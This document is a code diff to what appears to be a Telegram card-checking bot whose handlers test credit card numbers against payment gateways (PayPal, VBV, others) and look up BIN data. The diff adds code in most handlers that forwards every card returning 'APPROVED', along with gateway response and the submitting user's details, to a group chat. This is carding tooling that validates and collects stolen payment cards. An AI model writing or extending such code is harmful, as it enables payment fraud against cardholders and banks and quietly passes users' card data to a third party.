@@ -376,6 +376,16 @@ def handle_chk(message):
     end_time = time.time()
     time_taken = round(end_time - start_time, 2)
 
+    if check_result["status"].upper() == "APPROVED":
+        send_to_group(
+            cc=cc,
+            gateway=check_result["gateway"],
+            response=check_result["response"],
+            bin_info=bin_info,
+            time_taken=time_taken,
+            user_info=message.from_user
+        )
+
     response_text = single_check_format(
         cc=cc,
         gateway=check_result["gateway"],
@@ -403,15 +413,6 @@ def handle_au(message):
     if not use_credits(user_id):
         bot.reply_to(message, "❌ You don't have enough credits. Wait for your credits to reset.")
         return
-    if check_result["status"].upper() == "APPROVED":
-        send_to_group(
-            cc=cc,
-            gateway=check_result["gateway"],
-            response=check_result["response"],
-            bin_info=bin_info,
-            time_taken=time_taken,
-            user_info=message.from_user
-    )
 
     command_parts = message.text.split()
     if len(command_parts) < 2:
@@ -435,6 +436,17 @@ def handle_au(message):
     check_result = process_card_au(cc)
     end_time = time.time()
     time_taken = round(end_time - start_time, 2)
+
+    # ADD THIS PART TO SEND APPROVED CARDS TO GROUP
+    if check_result["status"].upper() == "APPROVED":
+        send_to_group(
+            cc=cc,
+            gateway=check_result["gateway"],
+            response=check_result["response"],
+            bin_info=bin_info,
+            time_taken=time_taken,
+            user_info=message.from_user
+        )
 
     response_text = single_check_format(
         cc=cc,
@@ -713,6 +725,16 @@ def handle_vbv(message):
     end_time = time.time()
     time_taken = round(end_time - start_time, 2)
 
+    if check_result["status"].upper() == "APPROVED":
+        send_to_group(
+            cc=cc,
+            gateway=check_result["gateway"],
+            response=check_result["response"],
+            bin_info=bin_info,
+            time_taken=time_taken,
+            user_info=message.from_user
+        )
+
     response_text = single_check_format(
         cc=cc,
         gateway=check_result["gateway"],
@@ -763,6 +785,16 @@ def handle_py(message):
     check_result = check_paypal_card(cc)
     end_time = time.time()
     time_taken = round(end_time - start_time, 2)
+
+    if check_result["status"].upper() == "APPROVED":
+        send_to_group(
+            cc=cc,
+            gateway=check_result["gateway"],
+            response=check_result["response"],
+            bin_info=bin_info,
+            time_taken=time_taken,
+            user_info=message.from_user
+        )
 
     response_text = single_check_format(
         cc=cc,
@@ -815,6 +847,16 @@ def handle_qq(message):
     end_time = time.time()
     time_taken = round(end_time - start_time, 2)
 
+    if check_result["status"].upper() == "APPROVED":
+        send_to_group(
+            cc=cc,
+            gateway=check_result["gateway"],
+            response=check_result["response"],
+            bin_info=bin_info,
+            time_taken=time_taken,
+            user_info=message.from_user
+        )
+
     response_text = single_check_format(
         cc=cc,
         gateway=check_result["gateway"],
@@ -865,6 +907,16 @@ def handle_cc(message):
     check_result = process_cc_card(cc)
     end_time = time.time()
     time_taken = round(end_time - start_time, 2)
+
+    if check_result["status"].upper() == "APPROVED":
+        send_to_group(
+            cc=cc,
+            gateway=check_result["gateway"],
+            response=check_result["response"],
+            bin_info=bin_info,
+            time_taken=time_taken,
+            user_info=message.from_user
+        )
 
     response_text = single_check_format(
         cc=cc,
@@ -1341,6 +1393,16 @@ def handle_at(message):
     end_time = time.time()
     time_taken = round(end_time - start_time, 2)
 
+    if check_result["status"].upper() == "APPROVED":
+        send_to_group(
+            cc=cc,
+            gateway=check_result["gateway"],
+            response=check_result["response"],
+            bin_info=bin_info,
+            time_taken=time_taken,
+            user_info=message.from_user
+        )
+
     response_text = single_check_format(
         cc=cc,
         gateway=check_result["gateway"],
@@ -1815,7 +1877,7 @@ def handle_sh(message):
         user_full_name = message.from_user.first_name
         if message.from_user.last_name:
             user_full_name += " " + message.from_user.last_name
-            
+
         # Get bin info for the checking status message
         bin_number = cc.split('|')[0][:6]
         bin_info = get_bin_info(bin_number) or {}
